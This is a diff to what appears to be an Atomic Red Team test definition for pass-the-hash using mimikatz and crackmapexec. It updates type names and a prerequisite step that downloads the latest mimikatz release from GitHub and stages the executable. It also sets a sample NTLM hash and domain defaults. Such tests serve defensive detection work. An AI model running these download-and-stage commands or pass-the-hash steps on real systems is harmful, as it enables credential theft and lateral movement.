@@ -11,15 +11,15 @@ atomic_tests:
   input_arguments:
     user_name:
       description: username
-      type: string
+      type: String
       default: Administrator
     ntlm:
       description: ntlm hash
-      type: string
+      type: String
       default: cc36cf7a8514893efccd3324464tkg1a
     domain:
       description: domain
-      type: string
+      type: String
       default: atomic.local
     mimikatz_path:
       description: mimikatz windows executable
@@ -34,7 +34,8 @@ atomic_tests:
       if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
     get_prereq_command: |
       $mimikatz_path = cmd /c echo #{mimikatz_path}
-      Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\mimikatz.zip"
+      $mimikatz_relative_uri = Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/latest" -UseBasicParsing | Select-Object -ExpandProperty Links | Where-Object -Property href -Like "*/mimikatz_trunk.zip" | Select-Object -ExpandProperty href
+      Invoke-WebRequest "https://github.com$mimikatz_relative_uri" -UseBasicParsing -OutFile "$env:TEMP\mimikatz.zip"
       Expand-Archive $env:TEMP\mimikatz.zip $env:TEMP\mimikatz -Force
       New-Item -ItemType Directory (Split-Path $mimikatz_path) -Force | Out-Null
       Move-Item $env:TEMP\mimikatz\x64\mimikatz.exe $mimikatz_path -Force
@@ -51,7 +52,7 @@ atomic_tests:
   input_arguments:
     user_name:
       description: username
-      type: string
+      type: String
       default: Administrator
     crackmapexec_exe:
       description: crackmapexec windows executable
@@ -59,15 +60,15 @@ atomic_tests:
       default: C:\CrackMapExecWin\crackmapexec.exe
     command:
       description: command to execute
-      type: string
+      type: String
       default: whoami
     ntlm:
       description: command
-      type: string
+      type: String
       default: cc36cf7a8514893efccd3324464tkg1a
     domain:
       description: domain
-      type: string
+      type: String
       default: atomic.local
   dependency_executor_name: powershell
   dependencies:
